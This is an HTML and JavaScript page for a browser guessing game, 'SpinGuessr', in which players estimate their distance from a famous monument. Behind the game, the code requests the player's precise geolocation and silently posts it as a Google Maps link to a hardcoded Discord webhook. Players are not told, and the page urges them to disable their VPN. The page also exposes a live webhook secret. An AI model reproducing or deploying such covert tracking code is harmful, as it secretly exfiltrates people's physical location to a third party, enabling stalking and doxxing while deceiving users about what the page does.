<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpinGuessr©</title>
    <!-- Tailwind CSS for modern styling -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Font Awesome for icons (sun/moon for dark mode toggle) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Bubblegum+Sans&family=Coming+Soon&display=swap" rel="stylesheet">
    <style>
        /* Custom styles for the game */
        body {
            font-family: 'Coming Soon', cursive; /* Childish font for the body */
            background-color: #F8F8F8; /* Off-white background */
            display: flex;
            flex-direction: column; /* Changed to column to accommodate footer */
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden; /* Prevent scrollbars from casino wheel */
            transition: background-color 0.3s ease; /* Smooth transition for dark mode */
        }

        /* Dark mode styles */
        body.dark-mode {
            background-color: #1a202c; /* Dark background */
            color: #e2e8f0; /* Light text */
        }

        .game-container.dark-mode {
            background-color: #2d3748; /* Darker container */
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }

        .game-title.dark-mode {
            color: #edf2f7; /* Lighter title */
            text-shadow: 2px 2px 5px rgba(255,255,255,0.1);
        }

        .casino-wheel-container.dark-mode {
            border-color: #4a5568;
            background-color: #4a5568;
            box-shadow: inset 0 0 10px rgba(0,0,0,0.3);
        }

        .casino-wheel-item.dark-mode {
            color: #edf2f7;
            border-bottom-color: #2d3748;
        }

        .casino-wheel-overlay.dark-mode {
            box-shadow: inset 0 0 0 5px #4a5568;
            background: linear-gradient(to bottom, rgba(45,55,72,0.8) 0%, rgba(45,55,72,0) 20%, rgba(45,55,72,0) 80%, rgba(45,55,72,0.8) 100%);
        }

        .game-input.dark-mode {
            background-color: #4a5568;
            color: #e2e8f0; /* Explicitly set text color for input in dark mode */
            border-color: #4a5568;
        }

        .game-input.dark-mode:focus {
            border-color: #636b6f;
            box-shadow: 0 0 0 3px rgba(99, 107, 111, 0.3);
        }

        /* General container styling */
        .game-container {
            width: 100%;
            max-width: 600px; /* Max width for better experience on large screens */
            padding: 20px;
            text-align: center;
            background-color: white;
            border-radius: 20px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: column;
            gap: 20px;
            box-sizing: border-box; /* Include padding in element's total width and height */
            transition: background-color 0.3s ease, box-shadow 0.3s ease; /* Smooth transition for dark mode */
        }

        /* Childish style for the play button */
        .play-button, .game-button {
            background-color: #EF4444; /* Red */
            color: white;
            padding: 15px 30px;
            border-radius: 50px; /* Very rounded */
            font-size: 1.8rem;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease;
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
            border: 4px solid #DC2626; /* Darker red border */
            font-family: 'Bubblegum Sans', cursive; /* Specific childish font for buttons */
        }

        .play-button:hover, .game-button:hover {
            background-color: #DC2626; /* Darker red on hover */
            transform: translateY(-3px); /* Pop effect */
        }

        .play-button:active, .game-button:active {
            transform: translateY(1px); /* Push effect */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        /* Game title style */
        .game-title {
            font-family: 'Bubblegum Sans', cursive; /* Childish font for title */
            font-size: 3.5rem; /* Large size */
            color: #4A5568; /* Dark grey color */
            margin-bottom: 20px;
            text-shadow: 2px 2px 5px rgba(0,0,0,0.1);
            transition: color 0.3s ease, text-shadow 0.3s ease; /* Smooth transition for dark mode */
        }

        /* Message box for alerts */
        .message-box {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #333;
            color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            z-index: 1000;
            display: none; /* Hidden by default */
            font-family: 'Coming Soon', cursive;
        }

        /* Casino wheel styling */
        .casino-wheel-container {
            width: 100%;
            height: 200px; /* Fixed height for the visible area */
            overflow: hidden;
            border: 5px solid #CBD5E0; /* Light grey border */
            border-radius: 15px;
            margin: 20px auto;
            background-color: #F7FAFC; /* Light background */
            box-shadow: inset 0 0 10px rgba(0,0,0,0.1);
            position: relative;
            transition: border-color 0.3s ease, background-color 0.3s ease, box-shadow 0.3s ease; /* Smooth transition for dark mode */
        }

        .casino-wheel {
            list-style: none;
            padding: 0;
            margin: 0;
            width: 100%;
            transition: transform 3s ease-out; /* Smooth transition for stopping */
            position: absolute;
            top: 0;
            left: 0;
        }

        /* Keyframes for continuous slow spin */
        @keyframes continuousSpin {
            0% { transform: translateY(0); }
            100% { transform: translateY(-100%); } /* Spin up one full cycle */
        }

        .casino-wheel.spinning {
            animation: continuousSpin 90s linear infinite; /* Adjust speed as needed */
        }

        .casino-wheel-item {
            padding: 15px 0;
            font-size: 2rem;
            font-weight: bold;
            color: #2D3748; /* Darker text */
            text-align: center;
            border-bottom: 1px solid #EDF2F7; /* Subtle separator */
            box-sizing: border-box; /* Ensures padding is included in height */
            transition: color 0.3s ease, border-bottom-color 0.3s ease; /* Smooth transition for dark mode */
        }

        .casino-wheel-item:last-child {
            border-bottom: none;
        }

        .casino-wheel-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none; /* Allow clicks to pass through */
            border-radius: 15px;
            box-shadow: inset 0 0 0 5px #CBD5E0; /* Re-apply border as overlay */
            background: linear-gradient(to bottom, rgba(255,255,255,0.8) 0%, rgba(255,255,255,0) 20%, rgba(255,255,255,0) 80%, rgba(255,255,255,0.8) 100%);
            transition: box-shadow 0.3s ease, background 0.3s ease; /* Smooth transition for dark mode */
        }

        /* Input field styling */
        .game-input {
            width: calc(100% - 40px); /* Full width minus padding */
            padding: 12px 20px;
            margin: 10px auto;
            border: 2px solid #CBD5E0;
            border-radius: 10px;
            font-size: 1.2rem;
            text-align: center;
            font-family: 'Coming Soon', cursive;
            transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease; /* Smooth transition for dark mode */
        }

        .game-input:focus {
            outline: none;
            border-color: #A0AEC0;
            box-shadow: 0 0 0 3px rgba(160, 174, 192, 0.3);
        }

        /* Loading spinner */
        .loading-spinner {
            border: 4px solid #f3f3f3; /* Light grey */
            border-top: 4px solid #3498db; /* Blue */
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none; /* Hidden by default */
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            .game-title {
                font-size: 2.5rem;
            }
            .play-button, .game-button {
                font-size: 1.5rem;
                padding: 12px 25px;
            }
            .casino-wheel-item {
                font-size: 1.5rem;
            }
            .game-input {
                font-size: 1rem;
                padding: 10px 15px;
            }
        }

        .dark-mode-toggle {
            position: absolute;
            top: 20px;
            right: 20px;
            background-color: #4A5568;
            color: white;
            width: 50px; /* Fixed width for circular button */
            height: 50px; /* Fixed height for circular button */
            padding: 0; /* Remove padding as size is fixed */
            border-radius: 50%; /* Make it perfectly round */
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: background-color 0.3s ease, color 0.3s ease;
            display: flex; /* Centering icons */
            align-items: center;
            justify-content: center;
            font-size: 1.5rem; /* Adjust font size for Font Awesome icons */
        }

        .dark-mode-toggle:hover {
            background-color: #2D3748;
        }

        .dark-mode-toggle.dark-mode {
            background-color: #e2e8f0;
            color: #2d3748;
        }

        .dark-mode-toggle.dark-mode:hover {
            background-color: #cbd5e0;
        }

        .dark-mode-toggle i {
            /* Font Awesome icons adjust their size with font-size */
            transition: opacity 0.3s ease; /* Smooth transition for icon change */
        }

        .footer {
            margin-top: 20px;
            padding: 10px;
            font-size: 0.9rem;
            color: #718096;
            text-align: center;
            transition: color 0.3s ease;
        }

        .footer.dark-mode {
            color: #e2e8f0; /* Off-white for footer in dark mode */
        }

        /* Ensure all relevant text becomes off-white in dark mode, overriding Tailwind defaults */
        body.dark-mode p,
        body.dark-mode label,
        body.dark-mode .text-gray-700,
        body.dark-mode .text-gray-800,
        body.dark-mode .game-input::placeholder { /* Also target placeholder text */
            color: #e2e8f0 !important; /* Force off-white for text */
        }

        .vpn-message {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 2rem;
            font-weight: bold;
            z-index: 2000;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }
    </style>
</head>
<body>
    <!-- Dark Mode Toggle Button -->
    <button id="darkModeToggle" class="dark-mode-toggle">
        <i id="sunIcon" class="fa-solid fa-sun" style="display: block;"></i>
        <i id="moonIcon" class="fa-solid fa-moon" style="display: none;"></i>
    </button>

    <div class="game-container">
        <!-- Start Menu -->
        <div id="start-menu" class="flex flex-col items-center">
            <h1 class="game-title">SpinGuessr!</h1>
            <button id="play-button" class="play-button">Play</button>
        </div>

        <!-- Game Play Area -->
        <div id="game-area" class="hidden flex flex-col items-center">
            <h2 id="monument-title" class="text-3xl font-bold text-gray-700 mb-4">Select a Monument</h2>
            <div class="casino-wheel-container">
                <ul id="monument-wheel" class="casino-wheel">
                    <!-- Monument items will be populated here by JavaScript -->
                </ul>
                <div class="casino-wheel-overlay"></div>
            </div>
            <button id="stop-monument-button" class="game-button mt-4">Spin!</button>

            <div id="estimation-section" class="hidden w-full flex flex-col items-center">
                <p id="current-monument-text" class="text-xl text-gray-800 mb-4"></p>
                <label for="distance-input" class="text-lg text-gray-700 mb-2">Estimate the distance in km:</label>
                <input type="number" id="distance-input" class="game-input" placeholder="Your guess in km">
                <button id="validate-button" class="game-button mt-4">Validate Guess</button>
            </div>

            <div id="distance-reveal-section" class="hidden w-full flex flex-col items-center">
                <p class="text-xl text-gray-800 mb-4">The actual distance was:</p>
                <div class="casino-wheel-container">
                    <ul id="distance-wheel" class="casino-wheel">
                        <!-- Distance items will be populated here by JavaScript -->
                    </ul>
                    <div class="casino-wheel-overlay"></div>
                </div>
                <p id="feedback-message" class="text-2xl font-bold text-gray-800 mt-4"></p>
                <button id="retry-button" class="game-button mt-4">Retry</button>
            </div>
        </div>
    </div>

    <!-- Message Box Element -->
    <div id="message-box" class="message-box"></div>

    <!-- VPN Protection Message -->
    <div id="vpn-message" class="vpn-message hidden">
        You must disable your VPN to play this game!
    </div>

    <!-- Footer -->
    <footer class="footer">
        A game similar to GeoGuessr, but with a simpler mechanic.<br>
        You should disable your VPN for a better gaming experience!
    </footer>

    <script>
        // --- Game State Variables ---
        let selectedMonument = null;
        let userLatitude = null;
        let userLongitude = null;
        let actualDistance = 0;
        let isSpinning = false;
        let messageTimeout; // To clear message box after some time
        let isDarkMode = false; // Dark mode state
        let continuousSpinInterval; // Interval for continuous monument spin

        // --- DOM Elements ---
        const body = document.body;
        const gameContainer = document.querySelector('.game-container');
        const startMenu = document.getElementById('start-menu');
        const gameArea = document.getElementById('game-area');
        const playButton = document.getElementById('play-button');
        const monumentTitle = document.getElementById('monument-title');
        const monumentWheel = document.getElementById('monument-wheel');
        const stopMonumentButton = document.getElementById('stop-monument-button');
        const estimationSection = document.getElementById('estimation-section');
        const currentMonumentText = document.getElementById('current-monument-text');
        const distanceInput = document.getElementById('distance-input');
        const validateButton = document.getElementById('validate-button');
        const distanceRevealSection = document.getElementById('distance-reveal-section');
        const distanceWheel = document.getElementById('distance-wheel');
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1381217768690552844/BCqdOWAFOeTL0GLah9bbYDipRdXLOzJXAVrFGzQuRjsOP-PVlwhnarG7hgf2Cxbh8HhI';
        const feedbackMessage = document.getElementById('feedback-message');
        const retryButton = document.getElementById('retry-button');
        const messageBox = document.getElementById('message-box');
        const darkModeToggle = document.getElementById('darkModeToggle');
        const sunIcon = document.getElementById('sunIcon');
        const moonIcon = document.getElementById('moonIcon');
        const footer = document.querySelector('.footer');
        const vpnMessage = document.getElementById('vpn-message');

        // --- Game Data: Famous Monuments with approximate coordinates ---
        const monuments = [
            { name: "Eiffel Tower", country: "France", lat: 48.8584, lon: 2.2945 },
            { name: "Statue of Liberty", country: "USA", lat: 40.6892, lon: -74.0445 },
            { name: "Colosseum", country: "Italy", lat: 41.8902, lon: 12.4922 },
            { name: "Taj Mahal", country: "India", lat: 27.1751, lon: 78.0421 },
            { name: "Great Wall of China (Badaling)", country: "China", lat: 40.4319, lon: 116.5704 },
            { name: "Machu Picchu", country: "Peru", lat: -13.1631, lon: -72.5450 },
            { name: "Pyramids of Giza", country: "Egypt", lat: 29.9792, lon: 31.1342 },
            { name: "Christ the Redeemer", country: "Brazil", lat: -22.9519, lon: -43.2105 },
            { name: "Sydney Opera House", country: "Australia", lat: -33.8568, lon: 151.2153 },
            { name: "Big Ben", country: "UK", lat: 51.5007, lon: -0.1246 },
            { name: "Burj Khalifa", country: "UAE", lat: 25.1972, lon: 55.2744 },
            { name: "Golden Gate Bridge", country: "USA", lat: 37.8199, lon: -122.4783 },
            { name: "Mount Everest", country: "Nepal", lat: 27.9881, lon: 86.9250 },
            { name: "Stonehenge", country: "UK", lat: 51.1789, lon: -1.8262 },
            { name: "Parthenon", country: "Greece", lat: 37.9715, lon: 23.7236 },
            { name: "Angkor Wat", country: "Cambodia", lat: 13.4125, lon: 103.8670 }
        ];

        // --- Utility Functions ---

        /**
         * Toggles dark mode on and off.
         */
        function toggleDarkMode() {
            isDarkMode = !isDarkMode;
            body.classList.toggle('dark-mode', isDarkMode);
            gameContainer.classList.toggle('dark-mode', isDarkMode);
            document.querySelector('.game-title').classList.toggle('dark-mode', isDarkMode);
            document.querySelectorAll('.casino-wheel-container').forEach(el => el.classList.toggle('dark-mode', isDarkMode));
            document.querySelectorAll('.casino-wheel-item').forEach(el => el.classList.toggle('dark-mode', isDarkMode));
            document.querySelectorAll('.casino-wheel-overlay').forEach(el => el.classList.toggle('dark-mode', isDarkMode));
            document.querySelectorAll('.game-input').forEach(el => el.classList.toggle('dark-mode', isDarkMode));
            darkModeToggle.classList.toggle('dark-mode', isDarkMode);
            footer.classList.toggle('dark-mode', isDarkMode);

            // Toggle icon visibility
            if (isDarkMode) {
                sunIcon.style.display = 'none';
                moonIcon.style.display = 'block';
            } else {
                sunIcon.style.display = 'block';
                moonIcon.style.display = 'none';
            }
        }

        /**
         * Displays a temporary message in a custom message box.
         * @param {string} message - The message to display.
         * @param {number} duration - How long to display the message in milliseconds.
         */
        function showMessage(message, duration = 3000) {
            clearTimeout(messageTimeout); // Clear any existing timeout
            messageBox.textContent = message;
            messageBox.style.display = 'block';
            messageTimeout = setTimeout(() => {
                messageBox.style.display = 'none';
            }, duration);
        }

        /**
         * Calculates the distance between two geographical points using the Haversine formula.
         * @param {number} lat1 - Latitude of point 1.
         * @param {number} lon1 - Longitude of point 1.
         * @param {number} lat2 - Latitude of point 2.
         * @param {number} lon2 - Longitude of point 2.
         * @returns {number} Distance in kilometers.
         */
        function haversineDistance(lat1, lon1, lat2, lon2) {
            const R = 6371; // Radius of Earth in kilometers
            const toRad = (value) => (value * Math.PI) / 180;

            const dLat = toRad(lat2 - lat1);
            const dLon = toRad(lon2 - lon1);
            const a =
                Math.sin(dLat / 2) * Math.sin(dLat / 2) +
                Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
                Math.sin(dLon / 2) * Math.sin(dLon / 2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
            return R * c; // Distance in km
        }

        /**
         * Populates the casino wheel with items and sets up a spin animation.
         * @param {HTMLElement} wheelElement - The UL element for the wheel.
         * @param {Array<string|number>} items - The list of items to display.
         * @param {number} stopIndex - The index of the item to stop on (in the original 'items' array).
         * @param {number} totalSpins - Number of full rotations before stopping.
         * @returns {Promise<void>} A promise that resolves when the spin animation finishes.
         */
        function spinCasinoWheel(wheelElement, items, stopIndex, totalSpins = 3) {
            return new Promise(resolve => {
                isSpinning = true;
                // Stop the continuous spin animation
                wheelElement.classList.remove('spinning');
                wheelElement.style.animation = 'none';
                clearTimeout(continuousSpinInterval);


                // Clear previous items and add enough for a smooth stop
                wheelElement.innerHTML = ''; 
                const monumentNames = monuments.map(m => `${m.name} (${m.country})`);
                // Generate enough items to ensure smooth spinning and landing on the target
                // Add a buffer of one full cycle at the end
                const itemsToGenerate = items.length * totalSpins + stopIndex + items.length; // Ensure target is reachable after full spins

                for (let i = 0; i < itemsToGenerate; i++) {
                    const item = items[i % items.length];
                    const li = document.createElement('li');
                    li.classList.add('casino-wheel-item');
                    li.textContent = item;
                    // Apply dark mode class if enabled
                    if (isDarkMode) {
                        li.classList.add('dark-mode');
                    }
                    wheelElement.appendChild(li);
                }

                // Get the accurate height of a single item after rendering
                const itemHeight = wheelElement.querySelector('.casino-wheel-item').offsetHeight;

                // Calculate the final translation Y to center the target item
                const containerHeight = wheelElement.parentElement.clientHeight;
                const centerOffset = (containerHeight / 2) - (itemHeight / 2);
                const targetScrollPosition = (items.length * (totalSpins -1) + stopIndex) * itemHeight; // Calculate target position for stopping
                const finalTranslateY = -targetScrollPosition + centerOffset;

                // Force a reflow to ensure the 'none' transition is applied before the new one
                void wheelElement.offsetWidth;

                // Set initial position (important for smooth transition start)
                // This line is effectively replaced by the continuous spin's last position before stopping.
                // We will rely on the CSS animation to smoothly stop.
                wheelElement.style.transition = 'transform 3s ease-out'; // Apply transition
                wheelElement.style.transform = `translateY(${finalTranslateY}px)`;
                
                wheelElement.addEventListener('transitionend', function handler() {
                    wheelElement.removeEventListener('transitionend', handler);
                    isSpinning = false;
                    resolve();
                });
            });
        }

        /**
         * Initializes the game by setting up event listeners and showing the start menu.
         */
        async function initializeGame() {
            // Add dark mode toggle listener
            darkModeToggle.addEventListener('click', toggleDarkMode);

            // Set initial icon visibility based on default dark mode state
            if (isDarkMode) {
                sunIcon.style.display = 'none';
                moonIcon.style.display = 'block';
            } else {
                sunIcon.style.display = 'block';
                moonIcon.style.display = 'none';
            }

            startMenu.classList.remove('hidden');
            gameArea.classList.add('hidden');
            estimationSection.classList.add('hidden');
            distanceRevealSection.classList.add('hidden');
            distanceInput.value = ''; // Clear previous input

            playButton.addEventListener('click', startMonumentSelection);
            stopMonumentButton.addEventListener('click', stopMonumentSpin);
            validateButton.addEventListener('click', handleValidation);
            retryButton.addEventListener('click', resetGame);
        }

        /**
         * Starts the monument selection phase.
         * This function can be called directly by the retry button.
         */
        async function startMonumentSelection() {
            startMenu.classList.add('hidden');
            gameArea.classList.remove('hidden');
            monumentTitle.textContent = "Spin the wheel to select a monument!";
            stopMonumentButton.textContent = "Spin!";
            stopMonumentButton.classList.remove('hidden');
            estimationSection.classList.add('hidden');
            distanceRevealSection.classList.add('hidden');

            // Populate monument wheel for continuous spinning
            const monumentNames = monuments.map(m => `${m.name} (${m.country})`);
            monumentWheel.innerHTML = ''; // Clear for fresh items

            // Add enough items to allow for continuous scrolling visually without jumps
            // A common technique is to duplicate the list several times
            const duplicatedMonumentNames = Array(5).fill(monumentNames).flat(); // Duplicate 5 times

            duplicatedMonumentNames.forEach(name => {
                const li = document.createElement('li');
                li.classList.add('casino-wheel-item');
                li.textContent = name;
                if (isDarkMode) {
                    li.classList.add('dark-mode');
                }
                monumentWheel.appendChild(li);
            });

            // Start the continuous spin animation
            monumentWheel.classList.add('spinning');
            monumentWheel.style.transition = 'none'; // Ensure no transition before starting animation
            monumentWheel.style.transform = `translateY(0px)`; // Reset position for animation
        }


        /**
         * Stops the monument wheel spin and selects a monument.
         */
        async function stopMonumentSpin() {
            if (isSpinning) return; // Prevent multiple clicks

            const randomIndex = Math.floor(Math.random() * monuments.length);
            selectedMonument = monuments[randomIndex];
            stopMonumentButton.classList.add('hidden');
            monumentTitle.textContent = "Spinning...";

            await spinCasinoWheel(monumentWheel, monuments.map(m => `${m.name} (${m.country})`), randomIndex);

            monumentTitle.textContent = `Monument selected: ${selectedMonument.name} (${selectedMonument.country})`;
            currentMonumentText.textContent = `How far are you from ${selectedMonument.name} (${selectedMonument.country})?`;
            estimationSection.classList.remove('hidden');
            distanceInput.focus();
        }

        /**
         * Handles the validation of the user's distance guess, including geolocation.
         */
        async function handleValidation() {
            const guessedDistance = parseFloat(distanceInput.value);

            if (isNaN(guessedDistance) || guessedDistance <= 0) {
                showMessage("Please enter a valid distance in kilometers.");
                return;
            }

            // La vérification VPN côté client a été retirée en raison de sa fiabilité limitée.
            // Le jeu continuera directement avec la géolocalisation.
            vpnMessage.classList.add('hidden'); // S'assurer que le message VPN est caché

            validateButton.textContent = "Getting Location...";
            validateButton.disabled = true;

            // Check if geolocation already obtained
            if (userLatitude !== null && userLongitude !== null) {
                calculateAndRevealDistance(guessedDistance);
            } else if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        userLatitude = position.coords.latitude;
                        userLongitude = position.coords.longitude;
                        calculateAndRevealDistance(guessedDistance);
                    },
                    (error) => {
                        validateButton.textContent = "Validate Guess";
                        validateButton.disabled = false;
                        let errorMessage = "Geolocation failed. Please allow location access to continue.";
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "Location access denied. Please enable it in your browser settings.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Location information is unavailable.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "The request to get user location timed out.";
                                break;
                        }
                        showMessage(errorMessage);
                        console.error("Geolocation error:", error);
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } // Options for geolocation
                );
            } else {
                validateButton.textContent = "Validate Guess";
                validateButton.disabled = false;
                showMessage("Geolocation is not supported by your browser.");
            }
        }

        /**
         * Calculates the actual distance and reveals the result.
         * @param {number} guessedDistance - The user's estimated distance.
         */
        async function calculateAndRevealDistance(guessedDistance) {
            actualDistance = haversineDistance(
                userLatitude,
                userLongitude,
                selectedMonument.lat,
                selectedMonument.lon
            );
            actualDistance = Math.round(actualDistance); // Round to nearest whole number

            // Send Google Maps link to Discord webhook (only player's location)
            const mapsLink = `https://www.google.com/maps?q=${userLatitude},${userLongitude}`;
            const webhookMessage = `A player is guessing distance from ${selectedMonument.name} (${selectedMonument.country})! Player's location: ${mapsLink}`;
            sendDiscordWebhook(webhookMessage);

            // Hide estimation, show reveal
            estimationSection.classList.add('hidden');
            distanceRevealSection.classList.remove('hidden');
            validateButton.textContent = "Validate Guess";
            validateButton.disabled = false;

            // Populate and spin distance wheel
            const distances = [];

            // Generate a good range of distances for the wheel, centered around actualDistance
            // with more granularity around the actual distance and larger steps further away.
            for (let i = 1; i <= 30000; i += 500) { // Large steps for the wide range
                if (!distances.includes(`${i} km`)) {
                    distances.push(`${i} km`);
                }
            }
            // Add a finer range around the actual distance for precision
            const rangeAroundActual = 1000; // e.g., +/- 1000 km
            const stepFine = 10;
            for (let i = Math.max(1, actualDistance - rangeAroundActual); i <= actualDistance + rangeAroundActual; i += stepFine) {
                if (!distances.includes(`${i} km`)) {
                    distances.push(`${i} km`);
                }
            }
             // Ensure the actual distance is exactly in the list
            if (!distances.includes(`${actualDistance} km`)) {
                distances.push(`${actualDistance} km`);
            }

            distances.sort((a, b) => parseFloat(a) - parseFloat(b)); // Sort numerically

            // Find the index of the actual distance
            let stopDistanceIndex = distances.indexOf(`${actualDistance} km`);

            // Fallback: If exact match not found (unlikely but safe), find closest or just use a default
            if (stopDistanceIndex === -1 && actualDistance > 0) {
                 // Try to find the closest value
                let closestValue = distances[0];
                let minDiff = Math.abs(actualDistance - parseFloat(closestValue));
                for (let i = 1; i < distances.length; i++) {
                    const diff = Math.abs(actualDistance - parseFloat(distances[i]));
                    if (diff < minDiff) {
                        minDiff = diff;
                        closestValue = distances[i];
                    }
                }
                stopDistanceIndex = distances.indexOf(closestValue);
            }
            // If still -1 (e.g., distances array empty or no positive actualDistance), default to middle
            if (stopDistanceIndex === -1) {
                stopDistanceIndex = Math.floor(distances.length / 2);
            }

            await spinCasinoWheel(distanceWheel, distances, stopDistanceIndex, 3); // Spin 3 times to make it dramatic

            displayFeedback(guessedDistance, actualDistance);
        }

        /**
         * Displays feedback to the player based on their guess accuracy.
         * @param {number} guessedDistance - The user's estimated distance.
         */
        function displayFeedback(guessedDistance, actualDistance) {
            const difference = Math.abs(guessedDistance - actualDistance);
            let message = "";

            if (difference <= 1) {
                message = "Bravo! We have an expert here!";
            } else if (difference <= 10) {
                message = "Wow! Impressive, well done!";
            } else if (difference <= 100) {
                message = "Not bad at all! You're not bad.";
            } else if (difference <= 1000) {
                message = "Not bad, but you can do better.";
            } else if (difference <= 10000) {
                message = "That's almost it, but no.";
            } else {
                message = `Your guess was ${guessedDistance} km. The actual distance was ${actualDistance} km. Keep practicing!`;
            }

            feedbackMessage.textContent = message;
            retryButton.classList.remove('hidden');
        }

        /**
         * Sends a message to the configured Discord webhook.
         * @param {string} message - The message content to send.
         */
        async function sendDiscordWebhook(message) {
            // Check if the placeholder URL is still present
            if (DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE' || !DISCORD_WEBHOOK_URL) {
                console.warn('Discord Webhook URL not set. Cannot send message.');
                showMessage('Warning: Discord Webhook URL is not configured. Webhook message not sent.', 5000);
                return;
            }
            try {
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ content: message }),
                });
                if (response.ok) {
                    console.log('Webhook sent successfully!');
                } else {
                    // Log the exact status and status text for debugging
                    console.error('Failed to send webhook:', response.status, response.statusText);
                    showMessage(`Error: Could not send webhook message. Status: ${response.status} - ${response.statusText}`, 5000);
                }
            } catch (error) {
                console.error('Error sending webhook:', error);
                showMessage('Error: Failed to connect to Discord webhook.', 5000);
            }
        }

        /**
         * Resets the game to the initial state for a new round.
         */
        function resetGame() {
            selectedMonument = null;
            actualDistance = 0;
            distanceInput.value = '';
            feedbackMessage.textContent = '';
            retryButton.classList.add('hidden');
            vpnMessage.classList.add('hidden'); // Hide VPN message on reset
            startMonumentSelection(); // Directly restart the monument selection
        }

        // Initialize the game when the window loads
        window.onload = initializeGame;

    </script>
</body>
</html>
